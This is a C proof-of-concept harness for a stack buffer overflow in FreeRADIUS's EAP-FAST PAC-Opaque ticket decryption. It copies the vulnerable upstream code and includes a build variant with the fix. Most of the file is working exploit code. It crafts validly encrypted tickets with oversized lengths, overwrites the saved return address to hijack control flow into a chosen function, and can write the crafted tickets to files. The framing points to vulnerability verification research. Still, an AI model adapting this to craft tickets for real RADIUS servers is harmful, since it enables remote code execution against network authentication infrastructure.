/*
 * Standalone harness for FreeRADIUS CVE-2026-127030 / GHSA-... EAP-FAST
 * SessionTicket stack overflow.  The struct layout, the vulnerable branch of
 * _session_ticket(), and eap_fast_decrypt() are copied from the upstream
 * tree at commit 3f802d74deef (parent of fix 064567a08f3b9d9b4863fab6...).
 *
 * Only the FreeRADIUS logging / talloc scaffolding is removed.  The decrypt
 * call and its length arithmetic are verbatim.  Build variants:
 *   default       vulnerable path (no length cap)
 *   -DFIXED       adds the exact two guards from fix commit 064567a0
 *   -fstack-protector-all    external stack-canary detector
 *   -fsanitize=address       ASan detector (may be blind: write is in libcrypto)
 *
 * All inputs are local files / in-memory buffers.  No listener, no probe of
 * any external system.
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <openssl/evp.h>
#include <openssl/err.h>

#define EAP_FAST_TLV_TYPE        0x3fff
#define PAC_INFO_PAC_OPAQUE      2
#define PAC_KEY_LENGTH           32
#define PAC_A_ID_LENGTH          16

/* Upstream: eap_fast.h (packed structs, sizes 6/8/36/50/152). */
typedef struct { uint16_t type; uint16_t length; } __attribute__((packed)) pac_hdr_t;
typedef struct { pac_hdr_t hdr; uint16_t data; } __attribute__((packed)) pac_type_t;
typedef struct { pac_hdr_t hdr; uint32_t data; } __attribute__((packed)) pac_lifetime_t;
typedef struct { pac_hdr_t hdr; uint8_t data[PAC_KEY_LENGTH]; } __attribute__((packed)) pac_key_t;
typedef struct {
    pac_type_t   type;
    pac_lifetime_t lifetime;
    pac_key_t    key;
} __attribute__((packed)) opaque_plaintext_t;
typedef struct {
    pac_hdr_t hdr;
    unsigned char aad[PAC_A_ID_LENGTH];
    unsigned char iv[EVP_MAX_IV_LENGTH];
    unsigned char tag[EVP_GCM_TLS_TAG_LEN];
    uint8_t data[sizeof(opaque_plaintext_t) * 2];
} __attribute__((packed)) eap_fast_attr_pac_opaque_t;

static uint8_t const key[PAC_KEY_LENGTH] = {
    0x00,0x01,0x02,0x03,0x04,0x05,0x06,0x07,0x08,0x09,0x0a,0x0b,0x0c,0x0d,0x0e,0x0f,
    0x10,0x11,0x12,0x13,0x14,0x15,0x16,0x17,0x18,0x19,0x1a,0x1b,0x1c,0x1d,0x1e,0x1f
};
static uint8_t const a_id[PAC_A_ID_LENGTH] = "frontier-a-id-0";
static unsigned long g_dst, g_rbp, g_orig_ret, g_orig_rbp;

static void verify_marker(void)
{
    puts("MARKER: chosen control-flow target executed");
    _exit(42);
}

/* Verbatim from eap_fast_crypto.c, commit 3f802d74deef (debug logging removed). */
static int eap_fast_decrypt(uint8_t const *ciphertext, size_t ciphertext_len,
                            uint8_t const *aad, size_t aad_len,
                            uint8_t const *tag, uint8_t const *k, uint8_t const *iv,
                            uint8_t *plaintext)
{
    EVP_CIPHER_CTX *ctx;
    int len, plaintext_len, ret;

    if (!(ctx = EVP_CIPHER_CTX_new())) return -1;
    if (!EVP_DecryptInit_ex(ctx, EVP_aes_256_gcm(), NULL, NULL, NULL)) return -1;
    if (!EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_IVLEN, 16, NULL)) return -1;
    if (!EVP_DecryptInit_ex(ctx, NULL, NULL, k, iv)) return -1;
    if (!EVP_DecryptUpdate(ctx, NULL, &len, aad, aad_len)) return -1;
    /* THE VULNERABLE WRITE: ciphertext_len is attacker-controlled (dlen),
     * plaintext points at the fixed 152-byte stack structure. */
    if (!EVP_DecryptUpdate(ctx, plaintext, &len, ciphertext, ciphertext_len)) return -1;
    plaintext_len = len;
    {
        unsigned char *tmp;
        /* Upstream quirk preserved: the tag pointer value, not its bytes. */
        memcpy(&tmp, &tag, sizeof(tmp));
        if (!EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_TAG, 16, tmp)) return -1;
    }
    ret = EVP_DecryptFinal_ex(ctx, plaintext + len, &len);
    EVP_CIPHER_CTX_free(ctx);
    if (ret == 0) return -1;
    plaintext_len += len;
    return plaintext_len;
}

static int craft(uint8_t *ticket, size_t cap, size_t dlen, uint8_t const *plain)
{
    eap_fast_attr_pac_opaque_t *o = (eap_fast_attr_pac_opaque_t *)ticket;
    EVP_CIPHER_CTX *ctx;
    int len, outl;
    uint8_t tag[16];

    if (dlen > cap - 4 - 48) return -1;
    memset(ticket, 0, cap);
    o->hdr.type = htons(EAP_FAST_TLV_TYPE | PAC_INFO_PAC_OPAQUE);
    o->hdr.length = htons((uint16_t)(dlen + sizeof(o->aad) + sizeof(o->iv) + sizeof(o->tag)));
    memcpy(o->aad, a_id, sizeof(o->aad));
    memset(o->iv, 0xA5, sizeof(o->iv));

    ctx = EVP_CIPHER_CTX_new();
    EVP_EncryptInit_ex(ctx, EVP_aes_256_gcm(), NULL, NULL, NULL);
    EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_IVLEN, 16, NULL);
    EVP_EncryptInit_ex(ctx, NULL, NULL, key, o->iv);
    EVP_EncryptUpdate(ctx, NULL, &len, a_id, sizeof(a_id));
    EVP_EncryptUpdate(ctx, o->data, &outl, plain, dlen);
    EVP_EncryptFinal_ex(ctx, o->data + outl, &len);
    EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_GET_TAG, 16, tag);
    memcpy(o->tag, tag, sizeof(tag));
    EVP_CIPHER_CTX_free(ctx);
    return (int)(4 + 48 + dlen);
}

static void dump_ticket(char const *path, uint8_t const *ticket, int len)
{
    FILE *f = fopen(path, "wb");
    if (!f) return;
    fwrite(ticket, 1, len, f);
    fclose(f);
}

__attribute__((noinline))
static int victim(uint8_t const *data, int len)
{
    eap_fast_attr_pac_opaque_t const *opaque = (eap_fast_attr_pac_opaque_t const *)data;
    eap_fast_attr_pac_opaque_t opaque_plaintext;   /* 152-byte stack destination */
    char const *errmsg = NULL;
    int length, dlen, r;

    __asm__ volatile("mov %%rbp, %0" : "=r"(g_rbp));
    g_dst = (unsigned long)&opaque_plaintext;
    g_orig_ret = *(unsigned long *)(g_rbp + 8);
    g_orig_rbp = *(unsigned long *)g_rbp;
    if (getenv("FR_PROBE"))
        printf("PROBE dst=%#lx rbp=%#lx ret_slot=%#lx offset=%ld dst_size=%zu\n",
               g_dst, g_rbp, g_rbp + 8,
               (long)((char *)(g_rbp + 8) - (char *)&opaque_plaintext),
               sizeof(opaque_plaintext));

    length = ntohs(opaque->hdr.length);
#ifdef FIXED
    /* Exact guards from upstream fix 064567a08f3b9d9b4863fab6. */
    if (len < (int)sizeof(opaque->hdr)) { errmsg = "PAC is too small"; goto reject; }
    if ((size_t)length > sizeof(*opaque) - sizeof(opaque->hdr)) {
        printf("FIXED: reject PAC is too long (length=%d cap=%zu)\n",
               length, sizeof(*opaque) - sizeof(opaque->hdr));
        return -2;
    }
#endif
    if (len < (int)(length + sizeof(opaque->hdr))) { errmsg = "PAC has bad length in header"; goto reject; }
    if (length < PAC_A_ID_LENGTH + EVP_MAX_IV_LENGTH + EVP_GCM_TLS_TAG_LEN + 1) {
        errmsg = "PAC file too short"; goto reject;
    }
    dlen = length - sizeof(opaque->aad) - sizeof(opaque->iv) - sizeof(opaque->tag);
    printf("victim: length=%d dlen=%d dst=%zu overflow=%+d\n",
           length, dlen, sizeof(opaque_plaintext), dlen - (int)sizeof(opaque_plaintext));
    r = eap_fast_decrypt((uint8_t const *)opaque->data, dlen,
                         opaque->aad, PAC_A_ID_LENGTH, opaque->tag,
                         key, opaque->iv, (uint8_t *)&opaque_plaintext);
    printf("victim: decrypt returned %d\n", r);
    if (getenv("FR_STATE")) {
        printf("STATE slot=%#lx orig=%#lx now=%#lx\n",
               g_rbp + 8, g_orig_ret, *(unsigned long *)(g_rbp + 8));
        *(unsigned long *)(g_rbp + 8) = g_orig_ret;   /* let the probe return cleanly */
        *(unsigned long *)g_rbp = g_orig_rbp;
    }
    return r < 0 ? -1 : 0;
reject:
    printf("victim: reject %s\n", errmsg);
    return -1;
}

int main(int argc, char **argv)
{
    setvbuf(stdout, NULL, _IONBF, 0);
    static uint8_t ticket[70000];
    long offset;
    size_t dlen;
    int tlen;
    uint8_t *plain;
    unsigned long target;

    if (argc < 2 || !strcmp(argv[1], "probe")) {
        tlen = craft(ticket, sizeof(ticket), 1, (uint8_t const *)"A");
        setenv("FR_PROBE", "1", 1);
        victim(ticket, tlen);
        return 0;
    }
    offset = strtol(argv[1], NULL, 0);            /* bytes from dst to saved RIP */
    if (offset <= 0 || offset > 60000) return 2;

    if (!strcmp(argv[2], "state")) {
        /* Chosen-value overwrite of the saved-RIP slot, then inspect it. */
        dlen = (size_t)offset + 8;
        plain = calloc(1, dlen);
        memset(plain, 0x42, dlen);
        craft(ticket, sizeof(ticket), dlen, plain);
        if (argc > 3) dump_ticket(argv[3], ticket, (int)(4 + 48 + dlen));
        setenv("FR_STATE", "1", 1);
        victim(ticket, (int)(4 + 48 + dlen));
        return 0;
    }

    /* Control-flow mode: put the address of verify_marker() at the saved-RIP
     * slot of the chosen-size decrypt destination. */
    dlen = (size_t)offset + 8;
    plain = calloc(1, dlen);

    target = (unsigned long)&verify_marker;
    memcpy(plain + offset, &target, sizeof(target));
    tlen = craft(ticket, sizeof(ticket), dlen, plain);
    if (argc > 3) dump_ticket(argv[3], ticket, tlen);
    printf("craft: dlen=%zu marker=%#lx\n", dlen, target);
    victim(ticket, tlen);
    puts("victim returned normally (no control-flow hijack)");
    return 0;
}
